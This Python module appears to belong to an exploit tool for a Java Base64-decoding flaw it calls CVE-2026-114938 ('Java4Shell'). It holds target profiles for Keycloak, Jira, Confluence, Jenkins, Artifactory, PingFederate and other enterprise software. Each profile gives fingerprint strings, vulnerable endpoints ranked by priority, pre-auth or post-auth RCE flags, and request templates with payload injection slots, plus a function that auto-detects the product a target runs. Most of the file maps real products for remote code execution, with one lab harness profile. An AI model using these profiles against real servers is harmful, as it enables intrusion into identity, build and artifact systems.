# language: Python 3.10+, file: modules/targets.py
# Target profiles for Java4Shell (CVE-2026-114938).
# Each profile defines: default ports, known vulnerable endpoints,
# version-detection hints, and attack surface priority order.

from dataclasses import dataclass, field
from typing import Optional


@dataclass
class TargetProfile:
    name: str
    description: str
    default_ports: list[int]
    # Ordered list of endpoints known to decode Base64 (highest impact first)
    endpoints: list[dict]
    # HTTP paths used to fingerprint the application
    fingerprint_paths: list[str]
    # Strings in response body/headers that confirm this app
    fingerprint_strings: list[str]
    # Auth type: "none" (pre-auth RCE), "basic", "token", "form"
    auth_type: str
    # Whether RCE is achievable pre-authentication
    pre_auth_rce: bool
    # Notes for operator
    notes: str = ""


# ─── Endpoint descriptor helpers ──────────────────────────────────────────────

def ep(path: str, method: str, surface: str, body_template: Optional[str] = None,
       headers: Optional[dict] = None, priority: int = 5) -> dict:
    return {
        "path": path,
        "method": method,
        "surface": surface,
        "body_template": body_template,  # {PAYLOAD} placeholder
        "extra_headers": headers or {},
        "priority": priority,  # 1 = highest
    }


# ─── Target Profiles ──────────────────────────────────────────────────────────

PROFILES: dict[str, TargetProfile] = {

    # ── Keycloak ──────────────────────────────────────────────────────────────
    "keycloak": TargetProfile(
        name="Keycloak",
        description="Open-source IAM — SAML and token endpoints decode Base64 pre-auth.",
        default_ports=[8080, 8443, 443, 80],
        pre_auth_rce=True,
        auth_type="none",
        fingerprint_paths=[
            "/auth/realms/master",
            "/realms/master",
            "/auth/",
        ],
        fingerprint_strings=["Keycloak", "keycloak", "realm", "auth/realms"],
        endpoints=[
            ep("/auth/realms/master/protocol/saml",   "POST", "SAML-SSO",
               body_template='SAMLRequest={PAYLOAD}&RelayState=test', priority=1,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/realms/master/protocol/saml",        "POST", "SAML-SSO",
               body_template='SAMLRequest={PAYLOAD}&RelayState=test', priority=1,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/auth/realms/master/protocol/openid-connect/token", "POST", "OAuth-Token",
               body_template='grant_type=password&client_id=admin-cli&username={PAYLOAD}&password=x',
               priority=2,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/auth/realms/master/login-actions/authenticate", "POST", "Form-Login",
               body_template='username={PAYLOAD}&password=x&credentialId=',
               priority=3,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/auth/",  "GET",  "HTTP-Basic-Auth", priority=4),
        ],
        notes="Versions < 24.0.5 on unpatched JDK. SAML endpoint is the primary pre-auth vector.",
    ),

    # ── Atlassian Jira ────────────────────────────────────────────────────────
    "jira": TargetProfile(
        name="Atlassian Jira",
        description="Project tracking — REST API and login accept Base64 credentials.",
        default_ports=[8080, 443, 80],
        pre_auth_rce=True,
        auth_type="basic",
        fingerprint_paths=[
            "/rest/api/latest/serverInfo",
            "/rest/api/2/serverInfo",
            "/login.jsp",
        ],
        fingerprint_strings=["Jira", "JIRA", "Atlassian", "jira-frontend"],
        endpoints=[
            ep("/rest/api/2/myself",      "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/rest/api/latest/myself", "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/rest/auth/1/session",    "POST", "JSON-Body",
               body_template='{{"username":"{PAYLOAD}","password":"x"}}',
               priority=2,
               headers={"Content-Type": "application/json"}),
            ep("/secure/admin/WebSudoAuthenticate.jspa", "POST", "Form-Login",
               body_template='webSudoPassword={PAYLOAD}&atl_token=x',
               priority=3,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/rest/api/2/attachment/",  "POST", "Multipart-Upload", priority=4),
        ],
        notes="Jira Data Center on unpatched JDK. Basic Auth on REST API triggers the intrinsic.",
    ),

    # ── Atlassian Confluence ──────────────────────────────────────────────────
    "confluence": TargetProfile(
        name="Atlassian Confluence",
        description="Wiki platform — SAML plugin and REST API are primary vectors.",
        default_ports=[8090, 443, 80],
        pre_auth_rce=True,
        auth_type="basic",
        fingerprint_paths=[
            "/rest/api/space",
            "/login.action",
            "/index.action",
        ],
        fingerprint_strings=["Confluence", "confluence", "Atlassian"],
        endpoints=[
            ep("/rest/api/user/current",  "GET",  "HTTP-Basic-Auth",   priority=1),
            ep("/dologin.action",          "POST", "Form-Login",
               body_template='os_username={PAYLOAD}&os_password=x&login=Log+In&os_destination=%2Findex.action',
               priority=2,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/plugins/servlet/saml/auth", "POST", "SAML-SSO",
               body_template='SAMLRequest={PAYLOAD}',
               priority=1,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/rest/api/content",        "POST", "JSON-Body",
               body_template='{{"type":"page","title":"{PAYLOAD}","space":{{"key":"~test"}},"body":{{"storage":{{"value":"","representation":"storage"}}}}}}',
               priority=3,
               headers={"Content-Type": "application/json"}),
        ],
        notes="CVE-2026-114938 hits Confluence via SAML plugin or Basic Auth on REST.",
    ),

    # ── Jenkins ───────────────────────────────────────────────────────────────
    "jenkins": TargetProfile(
        name="Jenkins",
        description="CI/CD server — API token and crumb endpoints decode Base64.",
        default_ports=[8080, 443, 80],
        pre_auth_rce=True,
        auth_type="basic",
        fingerprint_paths=[
            "/api/json",
            "/login",
            "/crumbIssuer/api/json",
        ],
        fingerprint_strings=["Jenkins", "hudson", "X-Jenkins"],
        endpoints=[
            ep("/api/json",                   "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/crumbIssuer/api/json",        "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/j_spring_security_check",     "POST", "Form-Login",
               body_template='j_username={PAYLOAD}&j_password=x&from=%2F&Submit=Sign+in',
               priority=2,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/securityRealm/createAccount", "POST", "Form-Login",
               body_template='username={PAYLOAD}&password1=x&password2=x&fullname=x&email=x%40x.com',
               priority=3,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/job/test/doSubmitDescription", "POST", "Multipart-Upload", priority=4),
        ],
        notes="Jenkins controller on unpatched JDK. Basic Auth on /api/json is reliable pre-auth.",
    ),

    # ── JFrog Artifactory ─────────────────────────────────────────────────────
    "artifactory": TargetProfile(
        name="JFrog Artifactory",
        description="Artifact repository — API and artifact upload paths decode Base64.",
        default_ports=[8081, 8082, 443, 80],
        pre_auth_rce=True,
        auth_type="basic",
        fingerprint_paths=[
            "/artifactory/api/system/ping",
            "/artifactory/",
            "/ui/login",
        ],
        fingerprint_strings=["Artifactory", "JFrog", "artifactory"],
        endpoints=[
            ep("/artifactory/api/system/ping",   "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/artifactory/api/security/user",  "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/artifactory/api/system/encrypt", "POST", "JSON-Body",
               body_template='"{PAYLOAD}"',
               priority=2,
               headers={"Content-Type": "application/json"}),
            ep("/artifactory/generic-local/",     "PUT",  "Multipart-Upload", priority=3),
        ],
        notes="Artifactory OSS and Pro. Ping endpoint is a lightweight pre-auth probe.",
    ),

    # ── PingFederate ──────────────────────────────────────────────────────────
    "pingfederate": TargetProfile(
        name="PingFederate",
        description="Enterprise SSO/SAML federation — SAML endpoints are primary vectors.",
        default_ports=[9031, 9999, 443, 80],
        pre_auth_rce=True,
        auth_type="none",
        fingerprint_paths=[
            "/pf/heartbeat.ping",
            "/idp/SSO.saml2",
            "/sp/SSO.saml2",
        ],
        fingerprint_strings=["PingFederate", "pingfederate", "PingIdentity"],
        endpoints=[
            ep("/idp/SSO.saml2",  "POST", "SAML-SSO",
               body_template='SAMLRequest={PAYLOAD}&RelayState=test',
               priority=1,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/sp/SSO.saml2",   "POST", "SAML-SSO",
               body_template='SAMLRequest={PAYLOAD}&RelayState=test',
               priority=1,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/pf/heartbeat.ping", "GET", "HTTP-Basic-Auth", priority=3),
            ep("/as/authorization.oauth2", "POST", "OAuth-Token",
               body_template='grant_type=password&client_id=test&username={PAYLOAD}&password=x',
               priority=2,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
        ],
        notes="PingFederate 11.x and 12.x on unpatched JDK. SAML POST binding is pre-auth.",
    ),

    # ── Apache Kafka (REST Proxy) ─────────────────────────────────────────────
    "kafka": TargetProfile(
        name="Apache Kafka (REST Proxy / AKHQ / Conduktor)",
        description="Kafka REST proxy and admin UIs decode Base64 credentials.",
        default_ports=[8082, 8080, 9092, 443],
        pre_auth_rce=False,
        auth_type="basic",
        fingerprint_paths=[
            "/topics",
            "/brokers",
            "/v3/clusters",
        ],
        fingerprint_strings=["kafka", "Kafka", "confluent", "akhq"],
        endpoints=[
            ep("/topics",          "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/v3/clusters",     "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/consumers/test",  "POST", "JSON-Body",
               body_template='{{"name":"{PAYLOAD}","format":"binary","auto.offset.reset":"earliest"}}',
               priority=2,
               headers={"Content-Type": "application/vnd.kafka.v2+json"}),
        ],
        notes="Post-auth RCE via Kafka REST Proxy. Requires valid credentials.",
    ),

    # ── Apache Solr ───────────────────────────────────────────────────────────
    "solr": TargetProfile(
        name="Apache Solr",
        description="Search platform — query and admin API accept Base64 blobs.",
        default_ports=[8983, 443, 80],
        pre_auth_rce=False,
        auth_type="basic",
        fingerprint_paths=[
            "/solr/admin/info/system",
            "/solr/#/",
            "/api/cluster",
        ],
        fingerprint_strings=["Solr", "solr", "Apache Solr", "solrconfig"],
        endpoints=[
            ep("/solr/admin/info/system", "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/api/cluster",            "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/solr/update",            "POST", "JSON-Body",
               body_template='[{{"id":"{PAYLOAD}"}}]',
               priority=2,
               headers={"Content-Type": "application/json"}),
            ep("/solr/select",            "GET",  "Query-Param",      priority=3),
        ],
        notes="Post-auth RCE. Solr Cloud with BasicAuth plugin enabled is the primary surface.",
    ),

    # ── Elasticsearch ─────────────────────────────────────────────────────────
    "elasticsearch": TargetProfile(
        name="Elasticsearch",
        description="Search engine — cluster API and index endpoints with Basic Auth.",
        default_ports=[9200, 9300, 443, 80],
        pre_auth_rce=False,
        auth_type="basic",
        fingerprint_paths=[
            "/",
            "/_cluster/health",
            "/_nodes",
        ],
        fingerprint_strings=["elasticsearch", "Elasticsearch", "elastic", "You Know, for Search"],
        endpoints=[
            ep("/_cluster/health",  "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/_nodes",           "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/_bulk",            "POST", "JSON-Body",
               body_template='{{"index":{{"_index":"test"}}}}\n{{"field":"{PAYLOAD}"}}\n',
               priority=2,
               headers={"Content-Type": "application/x-ndjson"}),
            ep("/test/_doc",        "POST", "JSON-Body",
               body_template='{{"data":"{PAYLOAD}"}}',
               priority=3,
               headers={"Content-Type": "application/json"}),
        ],
        notes="Post-auth only. Requires X-Pack security enabled with Basic Auth.",
    ),

    # ── Gerrit ────────────────────────────────────────────────────────────────
    "gerrit": TargetProfile(
        name="Gerrit Code Review",
        description="Git code review — REST API uses HTTP Digest/Basic with Base64.",
        default_ports=[8080, 29418, 443, 80],
        pre_auth_rce=False,
        auth_type="basic",
        fingerprint_paths=[
            "/a/accounts/self",
            "/accounts/self",
            "/config/server/info",
        ],
        fingerprint_strings=["Gerrit", "gerrit", "GerritCodeReview"],
        endpoints=[
            ep("/a/accounts/self",       "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/a/changes/",            "GET",  "HTTP-Basic-Auth",  priority=2),
            ep("/a/projects/",           "GET",  "HTTP-Basic-Auth",  priority=2),
            ep("/login/",                "GET",  "HTTP-Basic-Auth",  priority=3),
        ],
        notes="Post-auth RCE. Auth prefix '/a/' triggers HTTP Basic decode path.",
    ),

    # ── Spring Boot (generic) ─────────────────────────────────────────────────
    "spring": TargetProfile(
        name="Spring Boot (generic)",
        description="Generic Spring Boot application — actuator and API endpoints.",
        default_ports=[8080, 8443, 443, 80],
        pre_auth_rce=True,
        auth_type="basic",
        fingerprint_paths=[
            "/actuator",
            "/actuator/health",
            "/actuator/info",
            "/api",
        ],
        fingerprint_strings=["Spring", "spring", "Whitelabel Error Page", "actuator"],
        endpoints=[
            ep("/actuator/health",  "GET",  "HTTP-Basic-Auth",   priority=1),
            ep("/actuator",         "GET",  "HTTP-Basic-Auth",   priority=1),
            ep("/api/v1/login",     "POST", "JSON-Body",
               body_template='{{"username":"{PAYLOAD}","password":"x"}}',
               priority=2,
               headers={"Content-Type": "application/json"}),
            ep("/login",            "POST", "Form-Login",
               body_template='username={PAYLOAD}&password=x',
               priority=3,
               headers={"Content-Type": "application/x-www-form-urlencoded"}),
            ep("/upload",           "POST", "Multipart-Upload",  priority=4),
            ep("/api/data",         "POST", "JSON-Body",
               body_template='{{"data":"{PAYLOAD}","encoding":"base64"}}',
               priority=4,
               headers={"Content-Type": "application/json"}),
        ],
        notes="Generic profile. Adjust endpoint paths to match the actual application.",
    ),

    # ── Spinnaker ─────────────────────────────────────────────────────────────
    "spinnaker": TargetProfile(
        name="Spinnaker",
        description="Continuous delivery platform — Gate API uses Basic Auth.",
        default_ports=[8084, 9000, 443, 80],
        pre_auth_rce=False,
        auth_type="basic",
        fingerprint_paths=[
            "/gate/health",
            "/health",
            "/applications",
        ],
        fingerprint_strings=["spinnaker", "Spinnaker", "gate", "orca"],
        endpoints=[
            ep("/health",        "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/applications",  "GET",  "HTTP-Basic-Auth",  priority=1),
            ep("/tasks",         "POST", "JSON-Body",
               body_template='{{"job":[{{"type":"wait","waitTime":1}}],"application":"{PAYLOAD}","description":"test"}}',
               priority=2,
               headers={"Content-Type": "application/json"}),
        ],
        notes="Post-auth. Gate service is the exposed API surface.",
    ),

    # ── VulnApp (CVE-2026-114938 test harness) ────────────────────────────────
    "vulnapp": TargetProfile(
        name="VulnApp (Java4Shell Test Harness)",
        description="Reference vulnerable server for CVE-2026-114938 lab testing. "
                    "All surfaces decode Base64 pre-auth.",
        default_ports=[8080],
        pre_auth_rce=True,
        auth_type="none",
        fingerprint_paths=["/", "/health", "/api/decode"],
        fingerprint_strings=["Java4Shell Test Server", "CVE-2026-114938", "VulnApp"],
        endpoints=[
            # /api/decode: JSON body — strongest decode-error signal
            ep("/api/decode", "POST", "JSON-Body",
               body_template='{"data":"{PAYLOAD}"}',
               headers={"Content-Type": "application/json"},
               priority=1),
            # /auth/: HTTP Basic Auth header decode
            ep("/auth/", "GET", "HTTP-Basic-Auth", priority=1),
            # /saml/SSO: SAML request form field
            ep("/saml/SSO", "POST", "SAML-SSO",
               body_template="SAMLRequest={PAYLOAD}",
               headers={"Content-Type": "application/x-www-form-urlencoded"},
               priority=2),
            # /login: form-encoded username decode
            ep("/login", "POST", "Form-Login",
               body_template="username={PAYLOAD}&password=x",
               headers={"Content-Type": "application/x-www-form-urlencoded"},
               priority=3),
            # /api/data: query param decode
            ep("/api/data", "GET", "Query-Param", priority=4),
            # /upload: multipart body decode
            ep("/upload", "POST", "Multipart-Upload",
               body_template="--boundary\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\n{PAYLOAD}\r\n--boundary--",
               headers={"Content-Type": "multipart/form-data; boundary=boundary"},
               priority=5),
        ],
        notes="Lab test harness. Compile with JDK 21+. Run: java -server -Xms256m -Xmx512m VulnApp.",
    ),
}


# ─── Auto-detect from fingerprint ─────────────────────────────────────────────

def detect_profile(body: str, headers: dict) -> Optional[TargetProfile]:
    """
    Given a response body and headers, return the best-matching profile.
    Returns None if no profile matches.
    """
    combined = (body + " ".join(f"{k}:{v}" for k, v in headers.items())).lower()
    scores: list[tuple[int, TargetProfile]] = []
    for profile in PROFILES.values():
        score = sum(1 for s in profile.fingerprint_strings if s.lower() in combined)
        if score > 0:
            scores.append((score, profile))
    if not scores:
        return None
    scores.sort(key=lambda x: x[0], reverse=True)
    return scores[0][1]


def list_profiles() -> str:
    lines = ["  Available target profiles:\n"]
    for key, p in PROFILES.items():
        rce = "pre-auth RCE" if p.pre_auth_rce else "post-auth RCE"
        lines.append(f"  {key:<16} {p.name:<35} [{rce}]")
    return "\n".join(lines)
